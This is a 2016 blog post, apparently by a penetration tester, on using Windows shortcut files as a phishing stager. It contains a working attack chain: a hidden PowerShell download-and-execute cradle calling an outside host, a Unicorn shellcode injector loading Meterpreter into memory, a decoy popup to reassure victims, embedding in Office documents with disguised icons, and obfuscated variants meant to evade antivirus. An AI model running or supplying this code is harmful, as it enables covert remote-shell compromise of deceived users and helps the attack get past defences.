---
id: 9
title: Shortcuts another neat phishing trick
date: 2016-12-28 T21:50:00+01:00
author: Rik
layout: post
permalink: /2016/12/28/shortcuts-another-neat-phishing-trick/
---

<br><br>
Recently I read a blog about a Locky campaign using windows shortcut files to infect users. The microsoft blog describes a large scale phishing attack send Windows shortcut files in zip archives. For more inforamtion see: The TechNet blog.. The trick revolves around the fact that cmd.exe and powershell.exe both allow for commands passed via arguments. Creating a shortcut with the command parameters included will allow for powershell exectuion with a double click.

We do allot of phishing attacks and for all the backdoor related stuff we rely heavily on office macro’s using PowerShell. Or one of the available script formats like .js/.wsf/.jse/.hta etc etc. The issue is that organisations are disabling macro’s via the group policy and script files are being blocked via web/e-mail channels. If you haven’t blocked the execution of Macro’s via the command line look at this.

The Locky campaign used a download and execute trick which makes an executable touch disk which is easily detectable by AV. We cannot be AV-friendly as we rely on this for our phishing attacks detection would mess us up. Thats why we will use the lnk file als a stager, loading another PowerShell script which in turn will load Meterpreter. We could use a shortcut like the following:

```powershell
%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -command "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.255.170/script');"
```
On our webserver we can host the second stage, i like to use unicorn in order to inject our Meterpreter payload into memory. And combine that with a simple popup in order to tell the user everything is fine and to cary on with his or her day. So the “script” file we host will contain something like:

```powershell
powershell -ExecutionPolicy bypass -window hidden -e &lt;BASE64 ENCODED COMMAND&gt;
```

Keep in mind that PowerShell wants it’s commands in unicode, its easiest to just do prepare the base64 in PowerShell. Otherwise encode your command with utf_16_le before base64 encoding. For the popup box we can use the following code:

```powershell

#MessageBox
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") ; 
[System.Windows.Forms.MessageBox]::Show("Your system has now been enrolled, thank you for you cooperation.", "YourCompany Enrollment.") ;  
#Unicorn output
$XF3ZnA = '$a9wC = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $a9wC -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];[Byte[]]$z = 0xbf,0xbb,0x96,0xcd,0xd0,0xdb,0xc1,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x57,0x31,0x7d,0x15,0x83,0xc5,0x04,0x03,0x7d,0x11,0xe2,0x4e,0x6a,0x25,0x52,0xb0,0x93,0xb6,0x33,0x39,0x76,0x87,0x73,0x5d,0xf2,0xb8,0x43,0x16,0x56,0x35,0x2f,0x7a,0x43,0xce,0x5d,0x52,0x64,0x67,0xeb,0x84,0x4b,0x78,0x40,0xf4,0xca,0xfa,0x9b,0x28,0x2d,0xc2,0x53,0x3d,0x2c,0x03,0x89,0xcf,0x7c,0xdc,0xc5,0x7d,0x91,0x69,0x93,0xbd,0x1a,0x21,0x35,0xc5,0xff,0xf2,0x34,0xe4,0x51,0x88,0x6e,0x26,0x53,0x5d,0x1b,0x6f,0x4b,0x82,0x26,0x26,0xe0,0x70,0xdc,0xb9,0x20,0x49,0x1d,0x15,0x0d,0x65,0xec,0x64,0x49,0x42,0x0f,0x13,0xa3,0xb0,0xb2,0x23,0x70,0xca,0x68,0xa6,0x63,0x6c,0xfa,0x10,0x48,0x8c,0x2f,0xc6,0x1b,0x82,0x84,0x8d,0x44,0x87,0x1b,0x42,0xff,0xb3,0x90,0x65,0xd0,0x35,0xe2,0x41,0xf4,0x1e,0xb0,0xe8,0xad,0xfa,0x17,0x15,0xad,0xa4,0xc8,0xb3,0xa5,0x49,0x1c,0xce,0xe7,0x05,0x8c,0xb5,0x63,0xd6,0x38,0x42,0xe5,0xb8,0xd1,0xf8,0x9d,0x08,0x55,0x26,0x59,0x6e,0x4c,0x17,0xbe,0xc3,0x3c,0x04,0x13,0xb7,0xaa,0x90,0xc5,0x4e,0x8c,0x1b,0x3c,0xe3,0x81,0x89,0xbc,0x57,0x75,0x25,0x78,0x56,0x79,0xb5,0x96,0xd5,0x79,0xb5,0x66,0xc9,0x40,0xe7,0x57,0x23,0xd9,0x07,0xc8,0x23,0x4a,0x8e,0x77,0x75,0x8b,0x45,0x0e,0xbc,0x27,0x0d,0x11,0x73,0x28,0x49,0x42,0x20,0xfb,0x06,0x36,0x90,0x93,0x43,0xed,0x32,0x5f,0x6c,0xdb,0xdd,0xf5,0x98,0xbb,0x89,0x89,0xaf,0x43,0x4a,0x03,0x2f,0x29,0x4e,0x43,0xc5,0xb1,0x18,0x0b,0x6c,0x88,0x3a,0x4d,0x71,0xc1,0x10,0x01,0xde,0xb9,0xc0,0xcd,0xcd,0x3b,0xf5,0x76,0xf2,0x91,0x80,0x49,0x79,0x10,0xc4,0x3c,0x58,0x4c,0x2a,0x0b,0xf8,0xdb,0x35,0xa1,0x96,0xa3,0xa1,0x4a,0x76,0x24,0x32,0x23,0x76,0x24,0x72,0xb3,0x25,0x4c,0x2a,0x17,0x9a,0x69,0x35,0x82,0x8f,0x21,0x99,0xa4,0x48,0x92,0x75,0xb7,0xb6,0x1d,0x86,0xe4,0xe0,0x75,0x94,0x9c,0x85,0x64,0x67,0x75,0x10,0xa8,0xec,0xbb,0x91,0x2e,0x0c,0x87,0x20,0xf0,0x7b,0xe2,0x72,0x32,0xdc,0x04,0xf7,0x4b,0x1c,0x2b,0xc6,0x8a,0xd1,0xfa,0x19,0xdb,0x2d,0x2d,0x6b,0x16,0x7b,0x1f,0xba,0x6f,0xb3,0x5f;
$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$fRu=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($fRu.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$fRu,0,0,0);for (;;){Start-sleep 60};';
$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($XF3ZnA));$XF3Z = "-e ";if([IntPtr]::Size -eq 8){$ZsQ = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $ZsQ $XF3Z $e"}else{;iex "& powershell $XF3Z $e";} ;

```

The above PowerShell is a simple popup box combined with the output of Unicorn.py this allows us to load a our binary into memory.

Shortcuts can have any icon we want thats a big plus when we compare this to the script-based attacks. We can give it an icon that is appealing to a regular user or an icon that combines well with out phishing scenario.

this <img src="/images/short01.png" width="80"> or something like this <img src="/images/short02.png" width="80">

So lets recap:

* User clicks shortcut
* PowerShell gets executed
* Our script get’s downloaded & executed
* We receive our meterpreter shell
* User clicks and sees this:


Once the popup window is closed the second part get’s executed and we receive our shell.

<img src="/images/short03.png" width="600">


The modern version of Outlook blocks lnk files by default, an alternative would be to use a zip file containing a lnk file. Mostly I distribute the file via a file-download. If you choose to go this route use HTTPs Letsencrypt is free and you reduce the chance of detection via a proxy/webfilter.

Another interesting approach is embedding the file into an office document as an OLE object. This could be used as an alternative to the macro’s and gives a user a minimal warning. The warning for the lnk file is minor especially compared to the clicking of an .exe as embedded object. Great thing about OLE objects is the capability of using custom icons again:

<img src="/images/short04.png" width="600">



Clicking the icon in the office document will execute our PowerShell script. In the screenshot above we are using a simple Excel icon we could also do something with a button. That could be used for a scenario involving file decryption or some form of “activation”.
After a discussion with @Viss it seems that some AV companies try and detect scripts based on the Invoke-Expression alias. Invoke-Obfuscation can help bypass AV detection, after running our download script trough various iterations with Invoke-Obfuscation it can go from this:

<img src="/images/short05.png" width="600">


```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.255.170/script');
```

to this:

```powershell
Invoke-Expression( ([Regex]::Matches(" ))93]rahC[ f-)';)}'+'0{tpi'+'rc'+'s/07'+'1.'+'552'+'.861.291//:ptth}0'+'{(g'+'nirt'+'Sda'+'oln'+'woD.'+')'+'tn'+'ei'+'lC'+'beW.teN.m'+'etsyS tcejbO'+'-weN('+' XE'+'I'((( XEI ",'.', 'RightToLeft')-Join'' ) )
</code
>
to this:

```powershell
IEX( -JoIn ('49@6eM76M6fM6b{65U2d{45@78{70@72Z65Z73Z73Z69{6f&lt;6e@28{20@20M28@5b{52U65@67&amp;65&amp;78U5d@3a&lt;3aU4d&lt;61M74@63&lt;68I65M73U28@22{20&amp;29{29M39&lt;33&lt;5dM72I61U68M43Z5bU20&lt;20@66Z2d&amp;29I27U3b{29M7dZ27U2b&lt;27Z30M7bM74M70&lt;69&amp;27I2bI27{72I63Z27M2b@27@73M2fZ30&amp;37I27M2b@27&lt;31{2eZ27U2bM27@35I3532Z27Z2bZ27Z2e@38I36@31@2eI32U39{31I2f&lt;2f&lt;3a&amp;70I74&amp;74I68I7d&lt;30{27{2bZ27@7b&lt;28U67Z27&amp;2b@27@6e&lt;69&amp;72Z74I27I2bM27@53Z64&amp;61M27I2bZ27{6f&lt;6c{6e@27&amp;2bU27&lt;77M6f&amp;44&lt;2eZ27&lt;2b{27{29I27&lt;2bI27Z74{6e&lt;27@2b&lt;27M65I69M27@2bI27&amp;6cI43M27M2b@27U62&lt;65&amp;57{2eI74&lt;65{4e{2e&lt;6d@27I2b&lt;27I65{74I73&amp;79I53I20&lt;74Z63Z65@6a{62U4f&lt;27{2bZ27{2d&amp;77U65&amp;4eI28I27&amp;2b&lt;27{20Z58I45&amp;27Z2b&lt;27&amp;49@27U28{28{28&lt;20{58&amp;45U49Z20I22&amp;2c&lt;27@2eM27M2c{20@27&amp;52&lt;69&lt;67U68&lt;74Z54Z6f@4c&amp;65M66I74I27@29&amp;2dM4a@6f@69M6e{27{27@20M29{20@29'-sPLit '&lt;' -SPLIt'I'-SpLIT'Z'-splIT'&amp;'-SPLit'{' -sPLit'M'-SPliT'U'-SPlIt'@'|FoREaCH-oBjECt{( [COnveRT]::ToInT16( ( [StrinG]$_),16 )-As[char]) } ))
```

Invoke-Obfuscation is an awesome tool for obfuscating your PowerShell, it’ll save me some time during phishing exercises!

That’s all folks! If you have any questions, find me on Twitter: Follow <a href="https://twitter.com/rikvduijn">@rikvduijn</a>